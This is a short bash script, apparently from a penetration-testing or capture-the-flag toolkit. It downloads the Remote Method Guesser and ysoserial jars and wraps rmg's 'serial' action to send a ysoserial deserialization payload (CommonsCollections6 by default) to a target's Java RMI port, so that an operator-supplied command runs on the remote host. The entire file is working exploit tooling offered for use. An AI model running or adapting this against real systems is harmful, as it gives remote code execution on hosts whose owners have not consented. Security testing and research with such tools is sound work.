#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")

download_rmg() {
    local url="https://github.com/qtc-de/remote-method-guesser/releases/download/v5.1.0/rmg-5.1.0-jar-with-dependencies.jar"
    if [[ ! -f "rmg.jar" ]]; then
        echo "Downloading Remote Method Guesser..."
        wget -O rmg.jar "$url"
    fi
}

download_ysoserial() {
    local url="https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar"
    if [[ ! -f "ysoserial.jar" ]]; then
        echo "Downloading ysoserial..."
        wget -O ysoserial.jar "$url"
    fi
}

run_rmg() {
    echo "Running Remote Method Guesser..."
    local target_ip=$1
    local target_port=$2
    if [[ -z "$target_ip" ]]; then
        target_ip=$ip        
        echo "Target IP: $target_ip"
    fi
    if [[ -z $target_port ]]; then
        target_port=1099
        echo "Target port not specified, using default RMI port 1099."
    fi
    if [[ -z $serial_payload ]]; then
        serial_payload="CommonsCollections6"
        echo "Serial payload not specified, using default CommonsCollections6."
    fi
    if [[ -z $bound_name ]]; then
        echo "Bound name was not specified"
        return 1
    fi
    if [[ -z $signature ]]; then
        echo "Signature was not specified"
        return 1
    fi
    if [[ -z $cmd ]]; then
        echo "Command was not specified"
        return 1
    fi
    download_rmg
    download_ysoserial
    java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
        --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED  \
        --add-opens=java.base/java.util=ALL-UNNAMED \
        -jar rmg.jar serial $target_ip $target_port $serial_payload "$cmd" --bound-name "$bound_name" --signature "$signature" --yso ysoserial.jar
}